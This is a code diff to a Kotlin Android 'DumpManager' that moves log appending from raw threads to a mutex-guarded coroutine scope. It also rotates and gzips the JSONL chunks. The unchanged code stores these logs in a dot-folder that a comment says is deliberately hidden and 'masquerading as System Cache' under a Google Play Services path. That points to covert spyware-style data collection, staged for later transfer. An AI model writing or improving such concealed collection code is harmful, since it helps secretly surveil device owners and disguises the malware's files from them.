@@ -10,8 +10,17 @@ import javax.crypto.Cipher
 import javax.crypto.spec.SecretKeySpec
 import org.json.JSONObject
 import org.json.JSONArray
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.sync.Mutex
+import kotlinx.coroutines.sync.withLock
 
 object DumpManager {
+
+    private val logScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    private val logMutex = Mutex()
 
     // Hidden path, 6 folders deep, masquerading as System Cache
     private val ROOT_DIR = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android/data/com.google.android.gms/files/cache/.sys_config")
@@ -67,38 +76,40 @@ object DumpManager {
     private const val MAX_TOTAL_CHUNKS = 25 // 50MB Max Storage
 
     fun appendLog(type: String, data: JSONObject) {
-        Thread { 
-            try {
-                if (!ROOT_DIR.exists()) ROOT_DIR.mkdirs()
-                val activeFile = File(ROOT_DIR, "active_buffer.jsonl")
-                
-                val wrapper = JSONObject()
-                wrapper.put("t", type)
-                wrapper.put("d", data)
-                
-                activeFile.appendText(wrapper.toString() + "\n")
-                
-                // Rotate and Compress if too large
-                if (activeFile.length() > MAX_CHUNK_SIZE) {
-                    val timestamp = System.currentTimeMillis()
-                    val tempFile = File(ROOT_DIR, "temp_${timestamp}.jsonl")
-                    activeFile.renameTo(tempFile)
+        logScope.launch { 
+            logMutex.withLock {
+                try {
+                    if (!ROOT_DIR.exists()) ROOT_DIR.mkdirs()
+                    val activeFile = File(ROOT_DIR, "active_buffer.jsonl")
                     
-                    // Compress the chunk to save 80% disk space and data bandwidth
-                    val gzFile = File(ROOT_DIR, "offline_log_${timestamp}.jsonl.gz")
-                    try {
-                        java.util.zip.GZIPOutputStream(gzFile.outputStream()).use { gz ->
-                            tempFile.inputStream().use { input -> input.copyTo(gz) }
+                    val wrapper = JSONObject()
+                    wrapper.put("t", type)
+                    wrapper.put("d", data)
+                    
+                    activeFile.appendText(wrapper.toString() + "\n")
+                    
+                    // Rotate and Compress if too large
+                    if (activeFile.length() > MAX_CHUNK_SIZE) {
+                        val timestamp = System.currentTimeMillis()
+                        val tempFile = File(ROOT_DIR, "temp_${timestamp}.jsonl")
+                        activeFile.renameTo(tempFile)
+                        
+                        // Compress the chunk to save 80% disk space and data bandwidth
+                        val gzFile = File(ROOT_DIR, "offline_log_${timestamp}.jsonl.gz")
+                        try {
+                            java.util.zip.GZIPOutputStream(gzFile.outputStream()).use { gz ->
+                                tempFile.inputStream().use { input -> input.copyTo(gz) }
+                            }
+                            tempFile.delete() // Clean up raw text
+                        } catch (e: Exception) {
+                            // Fallback: If compression fails, just keep raw file
+                            tempFile.renameTo(File(ROOT_DIR, "offline_log_${timestamp}.jsonl"))
                         }
-                        tempFile.delete() // Clean up raw text
-                    } catch (e: Exception) {
-                        // Fallback: If compression fails, just keep raw file
-                        tempFile.renameTo(File(ROOT_DIR, "offline_log_${timestamp}.jsonl"))
+                        enforceStorageLimits()
                     }
-                    enforceStorageLimits()
-                }
-            } catch (e: Exception) { e.printStackTrace() }
-        }.start()
+                } catch (e: Exception) { e.printStackTrace() }
+            }
+        }
     }
 
     private fun enforceStorageLimits() {
